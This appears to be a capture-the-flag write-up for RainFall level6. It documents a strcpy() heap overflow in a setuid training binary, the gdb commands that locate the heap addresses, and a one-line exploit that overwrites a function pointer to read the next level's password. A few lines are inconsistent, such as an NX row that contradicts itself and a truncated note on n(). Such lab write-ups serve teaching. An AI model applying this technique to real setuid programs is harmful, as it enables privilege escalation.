# RainFall (level6)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/user/level6/level6`
- Type: **ELF 32-bit LSB executable** (`file -b ~/level6`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level6`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level6
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 /home/user/level6/level6
```

These describe the binary's privileges.
|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Runs with level7's effective id: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ❌     | GOT is writable.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are nonexecutable. Shellcode injection is possible.
|       PIE       |    ❌     | The stack's position is predictable.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to a "Use of Potentially Dangerous Function" ([CWE-676](https://cwe.mitre.org/data/definitions/676.html)). Not all [`strcpy()` man page](https://man7.org/linux/man-pages/man3/strcpy.3.html)s do explicitly state it as dangerous. This one describes it as cause of undefined behaviour.

`strcpy()` does not perform a buffer overrun check. It introduces a **stack/heap-overflow** opportunity when handling user-controlled input. In parallel, the kernel and binary do not implement modern security practices *(No-eXecute bit)* that would make it harder to exploit.

## Vulnerability analysis

Our binary is compiled for a **32-bit x86** system.  
It contains three user-defined functions (`main()`, `m()`, and `n()`). Although `n()` is never called in normal execution, calling it enables privilege escalation via setuid and execution of `system("/bin/cat /home/user/level7/.pass")`

We target the `main()` function because it utilizes the vulnerable `strcpy()` function.

`main()` defines two local pointer variables *(that we'll call `buffer` and `fn_ptr`)* which point to memory regions allocated sequentially on the heap via `malloc()`. Since `buffer` and `fn_ptr` are adjacent in memory, triggering a [heap-based buffer overflow](https://cwe.mitre.org/data/definitions/122.html) allows us to overwrite the function pointer (which currently holds the reference to `m()`) with the address of `n()`.

Using dynamic analysis, we find the address assigned to **`buffer`** by `malloc(64 * sizeof(char))`. Since [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization/) is disabled, this address remains constant relative to the binary's virtual memory.
```sh
$ gdb --batch -ex "start" -ex "tbreak *0x804848c" -ex "continue" -ex "stepi" -ex "finish" -ex "printf \"buffer = 0x%x\n\", \$eax" ~/level6
buffer = 0x804a008
```

Using dynamic analysis, we find the address assigned to **`fn_ptr`** by `malloc(1 * sizeof(uintptr_t))`. Since [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization/) is disabled, this address remains constant relative to the binary's virtual memory.
```sh
$ gdb --batch -ex "start" -ex "tbreak *0x804849c" -ex "continue" -ex "stepi" -ex "finish" -ex "printf \"fn_ptr = 0x%x\n\", \$eax" ~/level6
fn_ptr = 0x804a050
```

Between **`buffer`** and **`fn_ptr`**, there is a 72 byte offset *(`0x804a050` - `0x804a008`)*.

The `n()` function in the [source.asm](./source.asm) file specifies that:
- In **big-endian hex** notation, it's located at: `0x08048454`.
- In **little-endian hex** escape sequence, it's located at: `\x54\x84\x04\x08`.
- In **little-endian oct** escape sequence, it's located at: `\124\204\004\010`.

---

By static analysis of [source.asm](./source.asm), we notice that `n()`:
08048454

### Intent

Replace the address pointed by `fn_ptr` to `n()` through a `strcpy()` heap-based stack overflow.

## Exploit

```sh
# We write down the address of `n()` with a 72 char padding.
$ /level6 "$(printf "%72c%b" "c" "\124\204\004\010")"
```

And there we are.
